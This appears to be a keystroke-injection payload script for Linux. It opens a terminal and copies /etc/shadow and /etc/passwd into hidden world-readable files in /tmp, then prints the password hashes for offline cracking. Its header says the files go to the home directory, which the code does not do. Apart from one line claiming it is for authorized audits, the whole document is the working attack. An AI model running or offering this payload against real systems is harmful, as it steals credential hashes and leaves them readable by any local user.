REM ============================================================
REM  Linux · Shadow File + Hash Extraction
REM ============================================================
REM  Copies /etc/shadow and /etc/passwd to the user's home
REM  directory for offline password cracking with hashcat/john.
REM
REM  Requires sudo access (will prompt for password if not
REM  already cached). For authorized security audits.

DEFAULTDELAY 80

CTRL ALT t
DELAY 1500
STRINGLN sudo cp /etc/shadow /tmp/.shadow_audit && sudo cp /etc/passwd /tmp/.passwd_audit && sudo chmod 644 /tmp/.shadow_audit /tmp/.passwd_audit
DELAY 2000
STRINGLN echo "=== SHADOW HASHES ===" && cat /tmp/.shadow_audit | grep -v ':\*:' | grep -v ':!:'
DELAY 500
STRINGLN exit
